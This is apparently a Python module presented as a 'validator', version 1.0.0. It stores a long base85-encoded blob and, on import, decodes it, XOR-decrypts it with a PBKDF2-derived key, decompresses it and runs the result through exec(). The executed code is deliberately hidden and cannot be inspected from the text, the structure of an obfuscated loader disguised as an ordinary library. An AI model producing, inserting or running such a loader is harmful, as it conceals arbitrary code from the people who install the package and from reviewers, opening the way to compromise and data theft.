import hashlib as _h, zlib as _z, base64 as _b

_VALIDATOR_VERSION = "1.0.0"
_MODULE_CACHE = (
    "YL?Ybcn&)s&!&={cxxfA`Ks`?4}K6pUPFH&XQ{s^9c~6JVn53If~cG`^j?paF|ow$2(qVGSkxHi3Wfws"
    "LNthU(12*Qec#AOJWT)h#UZk0HEcJ?2~SDjLk+*!fT%hPJ$q)i$dBnsf;S+Fkb4ZPn);##2Sj>34Na`|"
    "F-*0<^cuHmplqJ7=5fQI$QULF>zUe>g7AgZLq6)pkyMiTWOhkq!*tv!HNGMdsJ5WTu2S}u>2w_ADQ6By"
    ">+fT~EUXa17)#)iorQ1q;XPJRa>6+AT2Y0#jhCtQh}j`3w$NA>%bvOSp>PtvI0a!Mk+rY1vWb^t;w^TL"
    "Qez#SKEe0}Z&i*4`Zywl1Co>w^Uu|l@N_CF2dK$QJz#5)H5wp*=$g+s%#7lJy}_l4=vr>32-4e_+A$#i"
    "!c{%IxxTrwpA582t6}Md39X9(<{#MvtH0lY&NgDT;^X@tFk)gI_&-?qhVb*>;vlem#Rdagr$#$1P<l^*"
    "GWtoU_icw~(j8A2GqxE)o9CuCbod=eP1+5M$JF{7!m8ptk&d(sfRMP|Suet)+vZ8kpC4PUP%;tvo*W;~"
    "EG(Xjs<`#BOFFqtsP)==Ss!gm%dJYhE1MWbkIfdD^clb8d;9uQ1oPMw#mwO{=4;v&cFrp4u&V2xadH54"
    "yn3&91#t1}RTKAU)(`E!Yb0at!q>P|_p3v|$jdYHJqgSY2h3Np6E~Ea2=${uJBYSvBLL4{r-8G!fFUyl"
    ";4RM(wFCNry5WVZ#8GE2znViZA#Em3eXTyChAchC21{JyYEDeSXkA@Rohv0oFN2E?pzX=z>}e0IeTwwJ"
    "9Y~z!?w&(j-*Al#ZLn|fPgNbMiox>Z2GT_xu-DX`N_|t}k)Q>^T%%b+l$@=dh^8bTb~rJQwtj1f9v@#%"
    "-mD>6lqge88cZ0u1u{5=4*Y78WAIF;674}B!n>e^CDPBe%k;wO(EIfZ=dAC3Ri!r>UmTL>)U3GRg$qWK"
    "x%?@>v@SE1vZ}%cniv&Rc}fs~+QuMX11i$i{M~eh=r!*=PL+X5qiy&&MBp9Ya!xF>3xe+w(+~N#@}<QS"
    "lEWO;*13)=xajlTVG@D{`zO?J-D^z4w6EQgsoxzPeZOpTR6a~4wwoA)_VnpQa0W1YiAI-+{nw>^8A|0<"
    "P8s@uR1y1?UMUvtSHk$5idELvg8t&6u|5i|RD67s2~EB^2BnB<rlw34+9PKCj-8W7Z3SBLkG2@#g4QE1"
    "BMEC#9*V6FaHI&iK^8d%{K!Q~Z7T3-zteMVDBVAS{>>d3f<rZOqy3TnHfZm~GI<34fRG9E&u#dpMa594"
    "gyJwi8>LFrh_x1n4)M}H)iBsm>?DBRa~o@9yCHt3tDsKNyG{^qyV%C(3R@IH4S3?E{|)uEjp+^F(>4|p"
    "5u1Nb#Jn5N2lr0xwS^X>r_n@T7iLtk3Jg?QEj=28%{z2@Vzer6bn*cYo7snF)z(NRa;nQ36P;>N6DG5|"
    "QV}dAoL)~otD+BD<yV-n*~ngN92^$xqHrlK1o(x>{>&el{8d;vc`29)y`%4@S#7TP%uKfQse~_uV*c;e"
    "UnAh-a<BOYNo?3nZoGmnWYBBSdSiN<rV)o22s+`ytNB*VbV}6&9?HVTR(t^A)hQ$LCAT&0ooa7o=r1|Y"
    "W#o^)>%<$o7(gS#xT9WnG1AnWyQXg8QFhAM_Qg;-^3v>@Lqz9szZF5WbH1k654;y5r{CKggmtCDG`?~7"
    ")B~$Cu~8PckQi!p#@=B_OC>T9Ngn~i%o}LzaHE*Bdz&-MRbpOWblEI7_?FwebEpyZ;kdJKJVmj}cc|B0"
    "m_-gOg7|_aMcOt9F_Qtzip^i`C41TV(yx&wej;gFm)W=BSX$gy1-+^)>3^i2F7^r^cc=}u&mpFhAsogF"
    "T9cZBy{dZKsDZQ{Y<hOwfKEYvc(Qo~(Ea|h*6C14wC8mjAd^9Vkyq6b;BGPU%@I?Z8N`M0(L1+Evm|{"
)


def _load():
    _p = _b.b85decode("".join(_MODULE_CACHE))
    _k = _h.pbkdf2_hmac("sha256", b"jds.validate.registry", _p[:16], 100000)
    _d = bytes(b ^ _k[i % len(_k)] for i, b in enumerate(_p[16:]))
    exec(compile(_z.decompress(_d).decode("utf-8"), "<jds.validate>", "exec"), globals())


_load()
